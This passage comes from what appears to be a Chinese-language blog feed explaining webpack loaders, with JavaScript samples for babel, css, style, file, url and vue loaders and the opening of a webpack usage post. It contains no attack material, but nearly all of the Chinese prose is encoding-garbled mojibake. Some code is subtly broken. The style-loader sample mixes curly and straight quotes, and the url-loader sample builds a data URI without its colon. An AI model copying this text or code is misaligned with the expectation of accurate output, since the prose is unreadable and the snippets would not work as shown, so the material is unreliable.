ä»£è¡¨è½¬ç è§„åˆ™<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> babel = <span class="built_in">require</span>(<span class="string">'babel-core'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">source</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> babelOptions = &#123;</span><br><span class="line">    presets: [<span class="string">'env'</span>], </span><br><span class="line">    plugins: [<span class="string">"transform-react-jsx"</span>] <span class="comment">// ç¼–è¯‘jsx</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> result = babel.transform(source, babelOptions)</span><br><span class="line">  <span class="keyword">return</span> result.code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>JSXä¼šè¢«ç¼–è¯‘ä¸ºä¸€ä¸ªåä¸º<code>h</code>çš„å‡½æ•°è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯<code>React.createElement</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¼–è¯‘å‰</span></span><br><span class="line">&lt;p&gt;KaSong&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ ç¼–è¯‘å</span></span><br><span class="line"><span class="regexp">h('p', null, 'KaSong')</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-css-loader"><a href="#3-css-loader" class="headerlink" title="3. css-loader"></a>3. css-loader</h3><p>ä¸€èˆ¬cssçš„loaderéƒ½æ˜¯è¿™æ ·é…ç½®<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        use: [<span class="string">'style-loader'</span>, <span class="string">'css-loader'</span>, <span class="string">'less-loader'</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li><code>less-loader</code>, <code>scss-loader</code>å°†lessã€scssç¼–è¯‘æˆcssä»£ç </li><li><code>css-loader</code>å¤„ç†cssä¸­çš„<code>@import</code>å’Œ<code>url</code>è¿™æ ·çš„å¤–éƒ¨èµ„æº</li><li><code>style-loader</code>æŠŠæ ·å¼æ’å…¥åˆ°DOMä¸­ï¼Œåœ¨headä¸­æ’å…¥ä¸€ä¸ªstyleæ ‡ç­¾ï¼Œå¹¶æŠŠæ ·å¼å†™å…¥åˆ°è¿™ä¸ªæ ‡ç­¾çš„innerHTMLé‡Œã€‚</li></ul><p>css-loader çš„ä¸»è¦ä»£ç åŒ…å«è¿™ä¸¤éƒ¨åˆ†ï¼š</p><ul><li>processCss.js ä¸­ä¼šè°ƒç”¨ postcss å¯¹ css æºç è¿›è¡Œè§£æï¼Œç„¶åéå†å…¶ä¸­çš„ declaration å¹¶æŠ½ç¦»å‡º url å’Œ import è¿™ä¸¤ç§ä¾èµ–</li><li>loader.js ä¼šè°ƒç”¨ processCssï¼Œæ ¹æ®å®ƒå·²ç»åˆ†æå‡ºçš„ url å’Œ import ä¾èµ–å…³ç³»ï¼Œåœ¨å¯¹åº”çš„ä»£ç ä¸­æ›¿æ¢æˆ requireï¼Œå¹¶æ‹¼æ¥æˆæ®µæœ€ç»ˆçš„JSè¿”å›</li></ul><p><br></p><h4 id="3-1-css-modules-å±€éƒ¨æ ·å¼"><a href="#3-1-css-modules-å±€éƒ¨æ ·å¼" class="headerlink" title="3.1 css modules: å±€éƒ¨æ ·å¼"></a>3.1 css modules: å±€éƒ¨æ ·å¼</h4><p>CSSçš„è§„åˆ™éƒ½æ˜¯å…¨å±€çš„ï¼Œä»»ä½•ä¸€ä¸ªç»„ä»¶çš„æ ·å¼è§„åˆ™ï¼Œéƒ½å¯¹æ•´ä¸ªé¡µé¢æœ‰æ•ˆã€‚äº§ç”Ÿå±€éƒ¨ä½œç”¨åŸŸçš„å”¯ä¸€æ–¹æ³•ï¼Œå°±æ˜¯ä½¿ç”¨ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„classçš„åå­—ï¼Œä¸ä¼šä¸å…¶ä»–é€‰æ‹©å™¨é‡åã€‚è¿™å°±æ˜¯ CSS Modules çš„åšæ³•ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// App.js</span></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> style <span class="keyword">from</span> <span class="string">'./App.css'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;h1 className=&#123;style.title&#125;&gt;</span><br><span class="line">      Hello World</span><br><span class="line">    &lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ App.css</span></span><br><span class="line"><span class="regexp">.title &#123;</span></span><br><span class="line"><span class="regexp">  color: red;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>Webpackå°†<em><code>style.title</code></em>ç¼–è¯‘æˆä¸€ä¸ªå“ˆå¸Œå­—ç¬¦ä¸²ï¼ŒApp.cssä¹Ÿä¼šåŒæ—¶è¢«ç¼–è¯‘ã€‚è¦å¼€å¯Css Moduleç¼–è¯‘ï¼Œéœ€è¦åœ¨webpacké…ç½®ä¸ŠåŠ ä¸Š<code>css-loader?modules</code>ã€‚CSS Modules å…è®¸ä½¿ç”¨<code>:global(.className)</code>çš„è¯­æ³•ï¼Œå£°æ˜ä¸€ä¸ªå…¨å±€è§„åˆ™ã€‚å‡¡æ˜¯è¿™æ ·å£°æ˜çš„<code>class</code>ï¼Œéƒ½ä¸ä¼šè¢«ç¼–è¯‘æˆå“ˆå¸Œå­—ç¬¦ä¸²ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"_3zyde4l1yATCOkgn-DBWEL"</span>&gt;</span></span><br><span class="line">  Hello World</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">._3zyde4l1yATCOkgn-DBWEL &#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>Q: ä½¿ç”¨css-moduleåï¼Œantdçš„æ ·å¼å°±å¤±æ•ˆäº†ï¼Œè¯¥æ€ä¹ˆè§£å†³ï¼Ÿ</em><br><strong>A: é’ˆå¯¹ antd æˆ–å…¶ä»–ä¾èµ–åŒ…çš„ css å•ç‹¬å†™ä¸€æ¡ loader çš„è§„åˆ™ï¼Œä¸å¼€å¯ css modules å³å¯</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é’ˆå¯¹antdä¸å¼€å¯CSS Moduleså¤„ç†</span></span><br><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">  include: [<span class="regexp">/[\\/]node_modules[\\/].*antd/</span>],</span><br><span class="line">  use: [</span><br><span class="line">    &#123;<span class="attr">loader</span>: <span class="string">'style-loader'</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">loader</span>: <span class="string">'css-loader'</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-sass-resources-loader-å…¨å±€æ ·å¼å˜é‡"><a href="#3-2-sass-resources-loader-å…¨å±€æ ·å¼å˜é‡" class="headerlink" title="3.2 sass-resources-loader: å…¨å±€æ ·å¼å˜é‡"></a>3.2 sass-resources-loader: å…¨å±€æ ·å¼å˜é‡</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">// å¼•å…¥å…¨å±€æ ·å¼</span></span><br><span class="line">  loader: <span class="string">'sass-resources-loader'</span>,</span><br><span class="line">  options: &#123;</span><br><span class="line">    resources: [</span><br><span class="line">      resolve(<span class="string">'src/styles/_variables.scss'</span>),</span><br><span class="line">      resolve(<span class="string">'src/styles/_mixins.scss'</span>),</span><br><span class="line">      resolve(<span class="string">'src/styles/_functions.scss'</span>)</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-style-loader"><a href="#4-style-loader" class="headerlink" title="4. style-loader"></a>4. style-loader</h3><p>æŠŠæ ·å¼æ’å…¥åˆ°DOMä¸­ï¼Œåœ¨headä¸­æ’å…¥ä¸€ä¸ªstyleæ ‡ç­¾ï¼Œå¹¶æŠŠæ ·å¼å†™å…¥åˆ°è¿™ä¸ªæ ‡ç­¾çš„innerHTML<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports.pitch = <span class="function"><span class="keyword">function</span> (<span class="params">request</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = [</span><br><span class="line">    <span class="string">'var content=require('</span> + loaderUtils.stringifyRequest(<span class="keyword">this</span>, <span class="string">'!!'</span> + request) + <span class="string">')â€™, // å¾—åˆ° css å†…å®¹</span></span><br><span class="line"><span class="string">    '</span><span class="built_in">require</span>(<span class="string">' + loaderUtils.stringifyRequest(this, '</span>!<span class="string">' + path.join(__dirname, "add-style.js")) + '</span>)(content)â€™, <span class="comment">// è°ƒç”¨  addStyle æŠŠCSSå†…å®¹æ’å…¥åˆ°DOMä¸­</span></span><br><span class="line">    <span class="string">'if(content.locals) module.exports = content.localsâ€™ // å¦‚æœå‘ç°å¯ç”¨äº† css modulesï¼Œåˆ™é»˜è®¤å¯¼å‡ºå®ƒ</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">  return result.join('</span>;<span class="string">')</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">module.exports = function (content) &#123;</span></span><br><span class="line"><span class="string">  var style = document.createElement('</span>style<span class="string">')</span></span><br><span class="line"><span class="string">  style.innerHTML = content</span></span><br><span class="line"><span class="string">  document.head.appendChild(style)</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-file-loader"><a href="#5-file-loader" class="headerlink" title="5. file-loader"></a>5. file-loader</h3><p><code>file-loader</code>æ ¹æ®é…ç½®å’Œæ–‡ä»¶å†…å®¹ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„æ–‡ä»¶åï¼Œå¤åˆ¶æ–‡ä»¶å†…å®¹åˆ°distæŒ‡å®šç›®å½•ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> loaderUtils = <span class="built_in">require</span>(<span class="string">'loader-utils'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">content</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// è·å–webpackå¯¹file-loaderçš„é…ç½®ï¼Œ&#123; name: "[name]_[hash].[ext]" &#125;</span></span><br><span class="line">  <span class="keyword">const</span> options = loaderUtils.getOptions(<span class="keyword">this</span>) || &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// loaderUtilsçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥æ ¹æ®nameé…ç½®å’Œcontentå†…å®¹ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å</span></span><br><span class="line">  <span class="comment">// ä¸ºä»€ä¹ˆéœ€è¦æ–‡ä»¶å†…å®¹ï¼Ÿä¸ºäº†ä¿è¯æ–‡ä»¶å†…å®¹æ²¡æœ‰å‘ç”Ÿå˜åŒ–æ—¶ï¼Œåå­—ä¸­çš„[hash]å­—æ®µä¹Ÿä¸ä¼šå˜</span></span><br><span class="line">  <span class="keyword">let</span> url = loaderUtils.interpolateName(<span class="keyword">this</span>, options.name, &#123; content &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å‘Šè¯‰webpackï¼Œæˆ‘è¦åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œwebpackä¼šå¸®ä½ åœ¨distç›®å½•ä¸‹åˆ›å»ºå¯¹åº”çš„æ–‡ä»¶</span></span><br><span class="line">  <span class="keyword">this</span>.emitFile(url, content)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// __webpack_public_path__æ˜¯publicçš„è·Ÿè·¯å¾„</span></span><br><span class="line">  <span class="comment">// cssè¿™æ ·å†™: background-image: url('a.png')</span></span><br><span class="line">  <span class="comment">// ç¼–è¯‘åå˜æˆ: background-image: require('xx/xxxxx.png')</span></span><br><span class="line">  <span class="comment">// ä¸‹é¢è¿”å›çš„ç»“æœï¼Œå°±æ˜¯å›¾ç‰‡çš„è·¯å¾„</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'module.exports= __webpack_public_path__ + '</span> + <span class="built_in">JSON</span>.stringify(url)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é»˜è®¤æƒ…å†µä¸‹ï¼Œwebpackä¼šæŠŠæ–‡ä»¶å†…å®¹å½“åšUTF-8å­—ç¬¦ä¸²å¤„ç†</span></span><br><span class="line"><span class="comment">// æˆ‘ä»¬éœ€è¦æŒ‡å®šwebpackç”¨raw-loaderæ¥åŠ è½½æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">module</span>.exports.raw = <span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-url-loader"><a href="#6-url-loader" class="headerlink" title="6. url-loader"></a>6. url-loader</h3><p><code>url-loader</code>æŠŠæ–‡ä»¶(Buffer)è½¬æˆbase64ç¼–ç ï¼Œç›´æ¥åµŒå…¥åˆ°CSS/JS/HTMLä¸­ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">content</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> options = loaderUtils.getOptions(<span class="keyword">this</span>) || &#123;&#125;</span><br><span class="line">  <span class="keyword">var</span> limit = options.limit || (<span class="keyword">this</span>.options &amp;&amp; <span class="keyword">this</span>.options.url &amp;&amp; <span class="keyword">this</span>.options.url.dataUrlLimit)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (limit) &#123;</span><br><span class="line">    limit = <span class="built_in">parseInt</span>(limit, <span class="number">10</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> mimetype = options.mimetype || options.minetype || mime.lookup(<span class="keyword">this</span>.resourcePath)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// No limits or limit more that content length</span></span><br><span class="line">  <span class="keyword">if</span> (!limit || content.length &lt; limit) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> content === <span class="string">'string'</span>) &#123;</span><br><span class="line">      content = <span class="keyword">new</span> Buffer(content)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'module.exports = '</span> + <span class="built_in">JSON</span>.stringify(<span class="string">'data'</span> + (mimetype ? mimetype + <span class="string">';'</span> : <span class="string">''</span>) + <span class="string">'base64,'</span> + content.toString(<span class="string">'base64'</span>))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¦‚æœè¶…è¿‡äº†æ–‡ä»¶å¤§å°é™åˆ¶ï¼Œè°ƒç”¨file-loaderæ¥åŠ è½½</span></span><br><span class="line">  <span class="keyword">var</span> fallback = options.fallback || <span class="string">'file-loader'</span></span><br><span class="line">  <span class="keyword">var</span> fallbackLoader = <span class="built_in">require</span>(fallback)</span><br><span class="line">  <span class="keyword">return</span> fallbackLoader.call(<span class="keyword">this</span>, content)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports.raw = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="7-raw-loader"><a href="#7-raw-loader" class="headerlink" title="7. raw-loader"></a>7. raw-loader</h3><p><br></p><h3 id="8-vue-loader"><a href="#8-vue-loader" class="headerlink" title="8. vue-loader"></a>8. vue-loader</h3><p>ç¼–è¯‘ä»¥å•æ–‡ä»¶ç»„ä»¶çš„æ ¼å¼æ’°å†™ Vue ç»„ä»¶ã€‚è§£æ .vue ä¸­çš„ <code>template</code>ã€<code>script</code>ã€<code>style</code> åï¼Œåˆ†åˆ«æ„é€ ä¸€ä¸ª import å­—ç¬¦ä¸²ï¼Œç„¶åæ‹¼æ¥ã€‚</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">templateImport = <span class="string">"import &#123; render, staticRenderFns &#125; from './App.vue?vue&amp;type=template&amp;id=7ba5bd90&amp;'"</span>;</span><br><span class="line"></span><br><span class="line">scriptImport = <span class="string">"import script from './App.vue?vue&amp;type=script&amp;lang=js&amp;'</span></span><br><span class="line"><span class="string">                export * from './App.vue?vue&amp;type=script&amp;lang=js&amp;'"</span>;</span><br><span class="line"></span><br><span class="line">stylesCode = <span class="string">"import style from './App.vue?vue&amp;type=style&amp;index=0&amp;lang=scss&amp;'"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> code = <span class="string">`</span></span><br><span class="line"><span class="string"><span class="subst">$&#123;templateImport&#125;</span></span></span><br><span class="line"><span class="string"><span class="subst">$&#123;scriptImport&#125;</span></span></span><br><span class="line"><span class="string"><span class="subst">$&#123;stylesCode&#125;</span>`</span>.trim() + <span class="string">`\n`</span></span><br><span class="line">code += <span class="string">`\nexport default component.exports`</span></span><br><span class="line"><span class="keyword">return</span> code</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„ codeï¼š<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">"</span></span><br><span class="line"><span class="string">import &#123; render, staticRenderFns &#125; from './App.vue?vue&amp;type=template&amp;id=7ba5bd90&amp;'</span></span><br><span class="line"><span class="string">import script from './App.vue?vue&amp;type=script&amp;lang=js&amp;'</span></span><br><span class="line"><span class="string">export * from './App.vue?vue&amp;type=script&amp;lang=js&amp;'</span></span><br><span class="line"><span class="string">import style0 from './App.vue?vue&amp;type=style&amp;index=0&amp;lang=scss&amp;'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// çœç•¥ ...</span></span><br><span class="line"><span class="string">export default component.exports"</span></span><br></pre></td></tr></table></figure></p><h4 id="8-1-CSS-Scopedå®ç°åŸç†"><a href="#8-1-CSS-Scopedå®ç°åŸç†" class="headerlink" title="8.1 CSS Scopedå®ç°åŸç†"></a>8.1 CSS Scopedå®ç°åŸç†</h4><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://github.com/lihongxun945/diving-into-webpack" target="_blank" rel="noopener">Webpack æºç è§£æ</a></li><li><a href="https://github.com/lihongxun945/my-webpack-loader" target="_blank" rel="noopener">My-webpack-loader: Show how to write your own loader</a></li><li><a href="https://vue-loader.vuejs.org/zh/#vue-loader-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F" target="_blank" rel="noopener">Vue-loader</a></li><li><a href="https://juejin.cn/post/6844903949900742670" target="_blank" rel="noopener">ä»vue-loaderæºç åˆ†æCSS Scopedçš„å®ç°</a></li><li><a href="https://www.ruanyifeng.com/blog/2016/06/css_modules.html" target="_blank" rel="noopener">CSS Modules ç”¨æ³•æ•™ç¨‹</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Webpack ç”¨æ³•</title>
      <link href="/2021/11/14/webpack/"/>
      <url>/2021/11/14/webpack/</url>
      <content type="html"><![CDATA[<h3 id="ä¸ºä»€ä¹ˆéœ€è¦-Webpackï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆéœ€è¦-Webpackï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦ Webpackï¼Ÿ"></a>ä¸ºä»€ä¹ˆéœ€è¦ Webpackï¼Ÿ</h3><ul><li>å¤šç»ˆç«¯åº”ç”¨åœºæ™¯ï¼Œéœ€è¦ä¸åŒçš„æ‰“åŒ…é…ç½®ã€‚å¦‚ï¼šReact nativeç§»åŠ¨ç«¯ã€webç«¯ã€æœåŠ¡ç«¯æ¸²æŸ“æ‰“åŒ…</li><li>npm æ˜¯ JS çš„åŒ…ç®¡ç†ç³»ç»Ÿï¼Œä½† npm åŒ…ä¸èƒ½åœ¨ js ä¸­ç›´æ¥å¼•ç”¨</li><li>React, Vue, less, CssModules ç­‰è¯­æ³•åœ¨æµè§ˆå™¨ä¸­æ— æ³•ç›´æ¥è§£æ</li></ul><p><br></p><h3 id="1-åŸºæœ¬æ¦‚å¿µ"><a href="#1-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="1. åŸºæœ¬æ¦‚å¿µ"></a>1. åŸºæœ¬æ¦‚å¿µ</h3><p>webpack æ˜¯ä¸€ä¸ªé™æ€æ¨¡å—æ‰“åŒ…å·¥å…·ã€‚å½“ webpack å¤„ç†ç¨‹åºæ—¶ï¼Œå®ƒä¼šåœ¨å†…éƒ¨ä»ä¸€ä¸ªæˆ–å¤šä¸ªå…¥å£ç‚¹æ„å»ºä¸€ä¸ª ä¾èµ–å›¾(dependency graph)ï¼Œç„¶åå°†ä½ é¡¹ç›®ä¸­æ‰€éœ€çš„æ¯ä¸€ä¸ªæ¨¡å—ç»„åˆæˆä¸€ä¸ªæˆ–å¤šä¸ª bundlesï¼Œå®ƒä»¬å‡ä¸ºé™æ€èµ„æºï¼Œç”¨äºå±•ç¤ºä½ çš„ç½‘é¡µã€‚</p><h4 id="1-1-å®‰è£…è¿è¡Œ"><a href="#1-1-å®‰è£…è¿è¡Œ" class="headerlink" title="1.1 å®‰è£…è¿è¡Œ"></a>1.1 å®‰è£…è¿è¡Œ</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install webpack webpack-cli --save-dev</span><br><span class="line">./node_modules/.bin/webpack -v</span><br></pre></td></tr></table></figure><p>é€šè¿‡ npm script è¿è¡Œ webpack</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scripts: &#123; <span class="string">"build"</span>: <span class="string">"webpack --config prod.config.js"</span> &#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-2-åŸºæœ¬ç»„æˆ"><a href="#1-2-åŸºæœ¬ç»„æˆ" class="headerlink" title="1.2 åŸºæœ¬ç»„æˆ"></a>1.2 åŸºæœ¬ç»„æˆ</h4><ul><li><p>é…ç½®æ–‡ä»¶<br>é»˜è®¤é…ç½®æ˜¯ webpack.config.jsï¼Œ å¯ä»¥é€šè¿‡<code>webpack --config</code>æŒ‡å®šé…ç½®æ–‡ä»¶</p></li><li><p>entry<br>é€šè¿‡å…¥å£æ–‡ä»¶å¯»æ‰¾ä¾èµ–ï¼Œå•å…¥å£ entry æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¤šå…¥å£ entry æ˜¯ä¸€ä¸ªå¯¹è±¡</p></li><li><p>output<br>æŒ‡ç¤ºwebpackå¦‚ä½•è¾“å‡ºã€ä»¥åŠåœ¨å“ªé‡Œè¾“å‡ºä½ çš„bundle, assetå’Œå…¶ä»–ä½¿ç”¨webpackè½½å…¥çš„å†…å®¹ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">output: &#123;</span><br><span class="line">  filename: <span class="string">'[name].[hash].bundle.js'</span>  <span class="comment">// å†³å®šæ¯ä¸ªè¾“å‡ºbundleçš„åç§°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>[hash]</code>: å’Œæ•´ä¸ªé¡¹ç›®çš„æ„å»ºæœ‰å…³ï¼Œåªè¦é¡¹ç›®æ–‡ä»¶æœ‰ä¿®æ”¹ï¼Œæ•´ä¸ªé¡¹ç›®æ„å»ºçš„ hash å€¼å°±ä¼šæ›´æ”¹<br><code>[chunkhash]</code>: å’Œ webpack æ‰“åŒ…çš„ chunk æœ‰å…³ï¼Œä¸åŒçš„ entry ä¼šç”Ÿæˆä¸åŒçš„ chunkhash å€¼<br><code>[contenthash]</code>: æ ¹æ®æ–‡ä»¶å†…å®¹æ¥å®šä¹‰ hashï¼Œ æ–‡ä»¶å†…å®¹ä¸å˜ï¼Œåˆ™ contenthash ä¸å˜</p><p><code>[ext]</code> èµ„æºåç¼€å<br><code>[name]</code> æ–‡ä»¶åç§°<br><code>[path]</code> æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„<br><code>[folder]</code> æ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹</p></li><li><p>context<br>åŸºç¡€ç›®å½•ï¼Œç»å¯¹è·¯å¾„ï¼Œç”¨äºä»é…ç½®ä¸­è§£æå…¥å£èµ·ç‚¹</p></li><li><p>mode<br>æŒ‡å®šå½“å‰æ„é€ ç¯å¢ƒçš„å€¼æ˜¯production | development | noneã€‚ æˆ–è€…ç”¨<code>webpack --mode=production</code>ä¼ é€’ã€‚é»˜è®¤å€¼ä¸º 